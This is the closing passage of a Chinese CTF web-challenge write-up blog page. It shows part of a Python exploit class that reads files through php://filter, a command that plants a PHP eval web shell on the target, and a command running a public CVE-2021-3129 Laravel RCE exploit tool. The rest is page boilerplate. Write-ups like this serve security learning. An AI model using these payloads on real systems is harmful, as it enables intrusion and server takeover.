+</span></span><span class=line><span class=cl>        <span class=n>path</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;php://filter/convert.base64-encode/resource=</span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Your file:(.*)&#34;</span><span class=p>,</span> <span class=n>flags</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>S</span><span class=p>)</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>base64</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>命令行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python my-cnext.py http://target-ip/ &#34;echo &#39;&lt;?=@eval(\$_POST[1]);?&gt;&#39; &gt; shell.php&#34;
+</span></span></code></pre></td></tr></table></div></div><h3 id=lookup>LookUp</h3><p>java不会（在学了在学了:sob:）</p><h3 id=ezlaravel>ezLaravel</h3><p>根据版本找到CVE-2021-3129，参考<a class=link href=https://github.com/vulhub/vulhub/tree/master/laravel/CVE-2021-3129 target=_blank rel=noopener>vulhub/laravel/CVE-2021-3129 at master · vulhub/vulhub</a>，用<a class=link href=https://github.com/joshuavanderpoll/CVE-2021-3129 target=_blank rel=noopener>工具</a>直接打就行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python CVE-2021-3129.py --chain Laravel/RCE12 --host &#34;http://target-ip/&#34; --force
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/wp/>Wp</a>
+<a href=/tags/ssti/>Ssti</a>
+<a href=/tags/jwt/>Jwt</a>
+<a href=/tags/pickle/>Pickle</a>
+<a href=/tags/nodejs/>Nodejs</a>
+<a href=/tags/laravel/>Laravel</a>
+<a href=/tags/afr/>AFR</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js integrity=sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js integrity=sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05 crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}],ignoredClasses:["gist"]})})</script></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84web%E5%85%A8wp/><div class=article-details><h2 class=article-title>2024网鼎杯青龙组Web全WP</h2></div></a></article><article><a href=/p/2021%E7%BE%8E%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86wp/><div class=article-details><h2 class=article-title>2021美团网络安全高校挑战赛web部分wp</h2></div></a></article><article><a href=/p/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8Aweb/><div class=article-details><h2 class=article-title>2021第五空间线上web</h2></div></a></article><article><a href=/p/dasjuly-x-cbctf-4th-%E9%83%A8%E5%88%86wp/><div class=article-details><h2 class=article-title>DasJuly X CBCTF 4th 部分wp</h2></div></a></article><article><a href=/p/cybrics2021/><div class=article-details><h2 class=article-title>CyBRICS2021</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//k1te.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2024 k1te's blog</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
